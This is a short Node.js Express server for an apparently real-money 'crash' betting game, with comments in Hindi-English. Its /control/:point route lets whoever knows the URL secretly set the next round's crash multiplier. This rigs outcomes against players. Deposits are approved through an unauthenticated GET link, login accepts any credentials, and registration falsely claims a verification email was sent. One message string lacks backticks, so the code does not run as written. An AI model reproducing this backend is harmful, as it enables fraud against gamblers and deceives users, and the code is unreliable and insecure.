const express = require('express');
const app = express();
const http = require('http').Server(app);
const io = require('socket.io')(http);

app.use(express.static('public'));
// --- MIDDLEWARE & AUTH BACKEND ---
app.use(express.json()); // JSON data receive karne ke liye zaroori hai

// 1. Registration API
app.post('/api/register', (req, res) => {
    const { name, mobile, email, pass } = req.body;
    console.log("Naya User Register ho raha hai:", name, email);
    
    // Temporary Success Message
    res.json({ 
        success: true, 
        message: Namaste ${name}! Verification link aapki email (${email}) par bhej diya gaya hai. 
    });
});

// 2. Login API
app.post('/api/login', (req, res) => {
    const { id, pass } = req.body;
    console.log("Login ki koshish:", id);

    // Testing ke liye login success message
    if (id && pass) {
        res.json({ success: true, message: "Login ho gaya!" });
    } else {
        res.json({ success: false, message: "Email aur Password dono bhariye." });
    }
});
let nextCrashPoint = null;

// Admin Approval: link.com/approve-deposit/500
app.get('/approve-deposit/:amount', (req, res) => {
    let amt = parseFloat(req.params.amount);
    let bonus = amt * 0.10; // 10% Bonus
    io.emit('depositApproved', { amount: amt, bonus: bonus });
    res.send(`Approved: ${amt} + ${bonus} Bonus`);
});

app.get('/control/:point', (req, res) => {
    nextCrashPoint = parseFloat(req.params.point);
    res.send("Next Crash: " + nextCrashPoint);
});

// Yahan aapka game loop (startRound) rahega...
const PORT = process.env.PORT || 3000;
http.listen(PORT, () => { console.log('Server Live'); });
